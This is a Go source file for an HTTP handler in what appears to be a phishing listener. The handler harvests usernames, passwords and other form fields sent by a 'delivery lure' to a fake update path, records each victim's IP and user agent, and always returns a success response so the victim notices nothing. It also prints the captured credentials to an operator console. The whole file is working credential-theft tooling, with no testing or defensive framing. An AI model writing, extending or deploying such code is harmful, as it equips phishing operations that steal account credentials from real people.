package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// credRecord is one captured credential line in creds.jsonl.
type credRecord struct {
	Time  string            `json:"time"`
	IP    string            `json:"ip"`
	UA    string            `json:"user_agent,omitempty"`
	User  string            `json:"user,omitempty"`
	Pass  string            `json:"pass,omitempty"`
	Extra map[string]string `json:"extra,omitempty"`
}

// credsHandler collects credentials submitted by the delivery lure
// (POST <auth-path>, default /updates/v2/auth) and appends them as JSON lines
// to a local file (default <certdir>/creds.jsonl). The mux registers this
// handler on the exact lure path, so anything else never reaches it; non-POST
// requests are answered with a plain 404 like the rest of the listener.
type credsHandler struct {
	path string
	hub  *hub
	mu   sync.Mutex
}

// userKeys/passKeys are the form fields the lure is allowed to submit, tried
// in order. Everything else that is not empty is kept in Extra.
var userKeys = []string{"email", "username", "user", "login", "account"}
var passKeys = []string{"password", "pass", "passwd", "pwd"}

func (c *credsHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.NotFound(w, r)
		return
	}
	body, err := io.ReadAll(io.LimitReader(r.Body, 64<<10))
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"ok":true}`))
		return
	}

	vals := parseCredsBody(r, body)

	rec := credRecord{
		Time: time.Now().UTC().Format(time.RFC3339),
		IP:   clientIP(r),
		UA:   r.UserAgent(),
		User: firstOf(vals, userKeys),
		Pass: firstOf(vals, passKeys),
	}
	for k, v := range vals {
		switch k {
		case "email", "username", "user", "login", "account",
			"password", "pass", "passwd", "pwd":
		default:
			if rec.Extra == nil {
				rec.Extra = map[string]string{}
			}
			rec.Extra[k] = v
		}
	}

	if rec.User != "" || rec.Pass != "" || len(rec.Extra) > 0 {
		if err := c.appendRecord(rec); err != nil {
			c.hub.printf("[!] cred capture write failed: %v", err)
		} else {
			c.hub.printf("\n[+] cred capture from %s:  user=%q  pass=%q",
				rec.IP, rec.User, rec.Pass)
		}
	}

	// Always answer 200 {"ok":true}: the lure flow must not break whether or
	// not the capture succeeded, and the response gives nothing away.
	w.Header().Set("Content-Type", "application/json")
	w.Write([]byte(`{"ok":true}`))
}

// parseCredsBody accepts either a JSON object or a form-encoded body and
// returns a lower-cased key -> trimmed value map.
func parseCredsBody(r *http.Request, body []byte) map[string]string {
	vals := map[string]string{}
	if strings.Contains(strings.ToLower(r.Header.Get("Content-Type")), "json") {
		var m map[string]string
		if json.Unmarshal(body, &m) == nil {
			for k, v := range m {
				if s := strings.TrimSpace(v); s != "" {
					vals[strings.ToLower(strings.TrimSpace(k))] = s
				}
			}
		}
		return vals
	}
	if q, err := url.ParseQuery(string(body)); err == nil {
		for k, vs := range q {
			if len(vs) > 0 {
				if s := strings.TrimSpace(vs[0]); s != "" {
					vals[strings.ToLower(strings.TrimSpace(k))] = s
				}
			}
		}
	}
	for k, vs := range r.URL.Query() {
		if len(vs) > 0 {
			if s := strings.TrimSpace(vs[0]); s != "" {
				if _, ok := vals[strings.ToLower(k)]; !ok {
					vals[strings.ToLower(k)] = s
				}
			}
		}
	}
	return vals
}

func firstOf(vals map[string]string, keys []string) string {
	for _, k := range keys {
		if v, ok := vals[k]; ok && v != "" {
			return v
		}
	}
	return ""
}

// clientIP prefers the tunnel-injected client address over cloudflared's
// loopback RemoteAddr.
func clientIP(r *http.Request) string {
	if ip := r.Header.Get("Cf-Connecting-Ip"); ip != "" {
		return ip
	}
	if xf := r.Header.Get("X-Forwarded-For"); xf != "" {
		if i := strings.IndexByte(xf, ','); i > 0 {
			return strings.TrimSpace(xf[:i])
		}
		return strings.TrimSpace(xf)
	}
	return r.RemoteAddr
}

// appendRecord writes one JSON line, serialised by c.mu.
func (c *credsHandler) appendRecord(rec credRecord) error {
	line, err := json.Marshal(rec)
	if err != nil {
		return err
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	if err := os.MkdirAll(filepath.Dir(c.path), 0o700); err != nil {
		return err
	}
	f, err := os.OpenFile(c.path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	defer f.Close()
	if _, err := f.Write(append(line, '\n')); err != nil {
		return err
	}
	return f.Sync()
}

// printCreds dumps the credential capture file to the operator console.
func printCreds(path string) {
	data, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			fmt.Println("(no credentials captured yet)")
			return
		}
		fmt.Println("[!]", err)
		return
	}
	lines := strings.TrimRight(string(data), "\n")
	if lines == "" {
		fmt.Println("(no credentials captured yet)")
		return
	}
	for _, ln := range strings.Split(lines, "\n") {
		fmt.Println(ln)
	}
}
